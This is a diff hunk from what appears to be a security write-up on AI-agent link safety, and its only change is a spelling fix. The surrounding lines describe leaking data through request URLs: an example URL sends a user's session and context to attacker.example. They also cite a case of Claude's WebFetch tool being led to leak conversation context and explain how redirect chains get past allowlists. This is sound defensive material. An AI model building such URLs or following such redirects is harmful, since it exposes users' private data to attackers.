@@ -29,7 +29,7 @@ https://attacker.example/collect?user=alice@corp.com&session=abc123&data=<contex
 
 The leak happens at the HTTP request level. The attacker's server logs the URL. The user sees nothing unusual in the chat. No response body needs to be read — the request alone does the damage. [Source: [AI Agent Link Safety](https://openai.com/index/ai-agent-link-safety/)]
 
-This is not hypothetical. A documented instance manipulated Claude's WebFetch tool into leaking prior conversation context by constructing a request URL that carried the secret data — the URL-as-data-channel thesis realised against a first-class coding-agent tool ([Simon Willison — Claude WebFetch exfiltration](https://simonwillison.net/2026/Jul/15/claude-web-fetch-exfiltration/)).
+This is not hypothetical. A documented instance manipulated Claude's WebFetch tool into leaking prior conversation context by constructing a request URL that carried the secret data — the URL-as-data-channel thesis realized against a first-class coding-agent tool ([Simon Willison — Claude WebFetch exfiltration](https://simonwillison.net/2026/Jul/15/claude-web-fetch-exfiltration/)).
 
 Redirect chains extend this attack. A URL points to a trusted domain that the agent might allowlist, then forwards straight to an attacker-controlled destination. The agent follows the redirect, and the attacker receives the request with the full query parameters. [Source: [AI Agent Link Safety](https://openai.com/index/ai-agent-link-safety/)]
 
